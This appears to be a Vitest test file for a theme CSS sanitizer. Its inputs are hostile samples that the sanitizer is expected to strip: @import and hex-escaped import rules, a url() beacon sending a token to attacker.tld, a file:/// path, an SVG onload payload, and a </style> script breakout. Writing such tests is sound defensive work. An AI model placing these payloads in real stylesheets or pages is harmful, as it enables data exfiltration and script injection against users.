import { describe, expect, it } from "vitest";
import { MAX_CUSTOM_THEME_CSS_BYTES, sanitizeCustomCss, sanitizeThemeCss } from "./theme-css-sanitizer";

describe("theme-css-sanitizer", () => {
  it("preserves safe CSS variables, #id fragments, and safe base64 PNG data URIs", () => {
    const pngData = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=";
    const raw = `
      :root { --accent: #6ea8fe; }
      .card { clip-path: url(#rounded-mask); background-image: url("${pngData}"); }
    `;
    const result = sanitizeThemeCss(raw);
    expect(result.strippedCount).toBe(0);
    expect(result.truncated).toBe(false);
    expect(result.css).toContain("--accent: #6ea8fe");
    expect(result.css).toContain('url("#rounded-mask")');
    expect(result.css).toContain(pngData);
  });

  it("strips @import, hex-escaped @\\69 mport, and @charset rules", () => {
    const raw = `
      @charset "UTF-8";
      @import url("https://evil.example/leak.css");
      @\\69 mport "https://evil.example/escaped.css";
      .ok { color: red; }
    `;
    const result = sanitizeThemeCss(raw);
    expect(result.strippedCount).toBeGreaterThanOrEqual(3);
    expect(result.css).not.toMatch(/@import|@charset|evil\.example/i);
    expect(result.css).toContain(".ok { color: red; }");
  });

  it("strips external https://, file:///, image-set(), and executable SVG data URIs", () => {
    const evilSvg = `data:image/svg+xml;utf8,<svg onload="alert(1)"></svg>`;
    const raw = `
      .a { background: url(https://attacker.tld/ping?token=secret); }
      .b { background: url("file:///C:/Windows/win.ini"); }
      .c { background-image: image-set(url("https://attacker.tld/1x.png") 1x); }
      .d { background-image: -webkit-image-set(url("https://attacker.tld/2x.png") 2x); }
      .e { background-image: url('${evilSvg}'); }
    `;
    const result = sanitizeThemeCss(raw);
    expect(result.strippedCount).toBe(5);
    expect(result.css).not.toMatch(/attacker\.tld|win\.ini|image-set|onload/i);
    expect(result.css).toContain(".a { background: none; }");
    expect(result.css).toContain(".b { background: none; }");
  });

  it("neutralizes </style> breakout attempts including CSS hex-escaped closing tags and @import blocks", () => {
    const raw = `.box { scroll-behavior: smooth; color: blue; } @import url("https://evil.tld/a") { } </\\73 tyle><script>window.pwned = true;</script>`;
    const result = sanitizeThemeCss(raw);
    expect(result.css).toContain("scroll-behavior: smooth");
    expect(result.css).not.toMatch(/evil\.tld|@import/i);
    expect(result.css).not.toMatch(/<\/\s*(?:style|\\73)/i);
  });

  it("truncates inputs exceeding the 64 KiB UTF-8 ceiling without splitting multi-byte characters", () => {
    const repeated = `/* 中文字体注释 */ .item { border-radius: 8px; }\n`.repeat(2200);
    expect(new TextEncoder().encode(repeated).byteLength).toBeGreaterThan(MAX_CUSTOM_THEME_CSS_BYTES);
    const result = sanitizeThemeCss(repeated);
    expect(result.truncated).toBe(true);
    expect(new TextEncoder().encode(result.css).byteLength).toBeLessThanOrEqual(MAX_CUSTOM_THEME_CSS_BYTES);
    expect(result.warnings.some((w) => w.includes("64 KiB"))).toBe(true);
  });
});
